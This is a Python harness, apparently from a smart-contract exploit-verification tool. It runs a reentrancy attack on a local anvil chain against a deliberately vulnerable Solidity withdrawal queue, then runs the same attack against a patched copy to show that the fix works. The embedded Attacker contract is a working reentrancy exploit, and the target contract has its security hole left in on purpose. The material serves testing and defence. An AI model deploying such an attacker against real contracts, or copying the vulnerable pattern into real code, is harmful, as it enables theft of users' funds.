#!/usr/bin/env python3
"""Run a proven exploit as real transactions on a real chain, and adjudicate the result.

The synthetic harness proves an attack inside `forge test`, where the harness is the
EVM's administrator and every gate in this project exists to stop that power reaching
the attack. This script gives the power away. anvil is started, accounts are handed out
with their private keys, and from then on the only way to act as somebody is to sign as
them. There is no `vm.prank` over JSON-RPC.

What comes out is a transcript: transaction hashes, gas actually burned, and balances
read back from the node rather than asserted in Solidity.

The scenario is a queue that pays out before it records the payout. A victim queues five
ether. An attacker queues one, claims it, and re-enters during the callback -- the nonce
has not been bumped yet, so the queue pays the same entry again, and again, until the
contract is empty. The victim's five ether is what pays for it.

Two directions, because one proves nothing on its own:

    python3 scripts/live_attack.py                  # the queue is drained
    python3 scripts/live_attack.py --patched        # one line moved; the attack reverts

The second is the argument. The attacker contract, the accounts, the amounts and the
transactions are byte-identical between the runs -- the only difference is where the
nonce is written. An exploit that drained both would not have been about the defect.
"""

from __future__ import annotations

import argparse
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from arbiter.live import (  # noqa: E402
    ChainUnavailable,
    LiveChain,
    Step,
    Transcript,
    assert_no_cheatcodes,
)

TARGET_SOL = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract WithdrawalQueue {
    mapping(address => uint256[]) public requests;
    mapping(address => uint256) public nonce;

    function requestWithdrawal() external payable {
        require(msg.value > 0, "zero");
        requests[msg.sender].push(msg.value);
    }

    function claim() external {
        uint256 n = nonce[msg.sender];
        uint256[] storage q = requests[msg.sender];
        require(n < q.length, "nothing queued");
        uint256 amount = q[n];
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "claim failed");
        nonce[msg.sender] = n + 1;          // <- after the call
    }

    receive() external payable {}
}
"""

# No cheatcodes, because there are none to reach: this contract is deployed by a real
# account and everything it does, it does with the ether it was actually sent.
ATTACKER_SOL = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IQueue {
    function requestWithdrawal() external payable;
    function claim() external;
}

contract Attacker {
    address public immutable target;
    address public immutable owner;
    uint256 public depth;

    constructor(address t) { target = t; owner = msg.sender; }

    function seed() external payable {
        IQueue(target).requestWithdrawal{value: msg.value}();
    }

    function attack() external {
        depth = 0;
        IQueue(target).claim();
    }

    receive() external payable {
        // Re-enter while the queue still thinks nothing has been paid out. Stop when
        // the contract can no longer cover another payout, so the attack ends by
        // emptying the target rather than by reverting.
        if (depth < 20 && target.balance >= msg.value) {
            depth++;
            IQueue(target).claim();
        }
    }

    function sweep() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
"""

# The same contract with the one line moved. Running the identical attack against this
# is the whole argument: an exploit that also drains the fixed version was never about
# the defect. On a chain this is not a lint or an assertion -- the transaction simply
# reverts, and the transcript says so.
PATCHED_SOL = TARGET_SOL.replace(
    """        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "claim failed");
        nonce[msg.sender] = n + 1;          // <- after the call""",
    """        nonce[msg.sender] = n + 1;          // <- before the call
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "claim failed");""",
)
assert PATCHED_SOL != TARGET_SOL, "the patch did not apply"

ETHER = 10**18


def _project(root: Path, patched: bool = False) -> Path:
    proj = root / "live"
    (proj / "src").mkdir(parents=True)
    (proj / "foundry.toml").write_text(
        '[profile.default]\nsrc = "src"\nout = "out"\nlibs = []\n'
        "auto_detect_solc = true\n",
        encoding="utf-8",
    )
    (proj / "src" / "WithdrawalQueue.sol").write_text(
        PATCHED_SOL if patched else TARGET_SOL, encoding="utf-8")
    (proj / "src" / "Attacker.sol").write_text(ATTACKER_SOL, encoding="utf-8")
    return proj


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8545)
    ap.add_argument("--json", type=Path, default=None)
    ap.add_argument("--patched", action="store_true",
                    help="deploy the fixed contract instead; the attack must FAIL")
    args = ap.parse_args()

    assert_no_cheatcodes(ATTACKER_SOL, "the attacker contract")

    with tempfile.TemporaryDirectory() as tmp:
        proj = _project(Path(tmp), patched=args.patched)
        try:
            chain = LiveChain(port=args.port)
            chain.start()
        except ChainUnavailable as exc:
            print(f"  cannot start a chain: {exc}")
            return 2

        try:
            t = Transcript(rpc=chain.rpc, chain_id=chain.chain_id())
            deployer, victim, attacker = chain.accounts[0], chain.accounts[1], chain.accounts[2]
            print(f"  chain {t.chain_id} at {t.rpc}")
            print(f"  victim   {victim.address}")
            print(f"  attacker {attacker.address}\n")

            target, tx = chain.deploy(proj, "src/WithdrawalQueue.sol:WithdrawalQueue",
                                      deployer.key)
            t.target = target
            t.steps.append(Step(what="deploy WithdrawalQueue", actor=deployer.address,
                                tx=tx))
            print(f"  queue deployed at {target}")

            # The victim is an ordinary user doing an ordinary thing.
            t.steps.append(chain.send(victim.key, target, "requestWithdrawal()",
                                      value_wei=5 * ETHER))
            victim_paid_in = 5 * ETHER

            atk_contract, tx = chain.deploy(proj, "src/Attacker.sol:Attacker",
                                            attacker.key, ctor=[target])
            t.attacker_contract = atk_contract
            t.steps.append(Step(what="deploy Attacker", actor=attacker.address, tx=tx))

            t.steps.append(chain.send(attacker.key, atk_contract, "seed()",
                                      value_wei=1 * ETHER))
            attacker_paid_in = 1 * ETHER

            before = {
                "target": chain.balance(target),
                "attacker_eoa": chain.balance(attacker.address),
                "attacker_contract": chain.balance(atk_contract),
                "victim": chain.balance(victim.address),
            }
            t.balances["before_attack"] = before
            print(f"  queue holds {before['target'] / ETHER:.2f} ether "
                  f"({victim_paid_in / ETHER:.0f} of it the victim's)")

            attack = chain.send(attacker.key, atk_contract, "attack()")
            t.steps.append(attack)
            print(f"  attack tx {attack.tx}  gas {attack.gas_used:,}"
                  f"{'' if attack.ok else '   REVERTED'}")

            sweep = chain.send(attacker.key, atk_contract, "sweep()")
            t.steps.append(sweep)

            # The victim now tries to do what they queued. On a chain, this either works
            # or it does not -- there is nothing to assert.
            claim = chain.send(victim.key, target, "claim()")
            t.steps.append(claim)
            print(f"  victim's claim: {'succeeded' if claim.ok else 'FAILED'}"
                  f"{'  (' + claim.note[-60:] + ')' if not claim.ok else ''}")

            after = {
                "target": chain.balance(target),
                "attacker_eoa": chain.balance(attacker.address),
                "attacker_contract": chain.balance(atk_contract),
                "victim": chain.balance(victim.address),
            }
            t.balances["after_attack"] = after

            gas_spent = sum(s.gas_used for s in t.steps if s.actor == attacker.address)
            drained = before["target"] - after["target"]
            attacker_net = (
                after["attacker_eoa"] + after["attacker_contract"]
                - before["attacker_eoa"] - before["attacker_contract"]
            )
            # What the victim got back for the five ether they queued.
            victim_recovered = 0 if not claim.ok else victim_paid_in

            t.verdict = {
                "target_drained_wei": drained,
                "attacker_net_wei": attacker_net,
                "attacker_capital_wei": attacker_paid_in,
                "attacker_gas_used": gas_spent,
                "victim_paid_in_wei": victim_paid_in,
                "victim_recovered_wei": victim_recovered,
                "victim_shortfall_wei": victim_paid_in - victim_recovered,
                "proven": bool(
                    drained > 0
                    and attacker_net > 0
                    and victim_recovered < victim_paid_in
                ),
            }

            print(f"\n  queue drained      {drained / ETHER:>10.4f} ether")
            print(f"  attacker net       {attacker_net / ETHER:>10.4f} ether "
                  f"(put in {attacker_paid_in / ETHER:.0f}, gas {gas_spent:,})")
            print(f"  victim shortfall   "
                  f"{(victim_paid_in - victim_recovered) / ETHER:>10.4f} ether")

            if t.verdict["proven"]:
                print("\n  PROVEN on a live chain: value left the contract, the attacker "
                      "holds it,\n  and an ordinary user who queued first cannot get "
                      "theirs back.")
            else:
                print("\n  NOT PROVEN. The transcript above is what actually happened.")

            if args.json:
                args.json.write_text(
                    json.dumps(t.as_dict(), indent=1), encoding="utf-8"
                )
                print(f"\n  transcript: {args.json}")
            proven = bool(t.verdict["proven"])
            return (1 if proven else 0) if args.patched else (0 if proven else 1)
        finally:
            chain.stop()


if __name__ == "__main__":
    raise SystemExit(main())
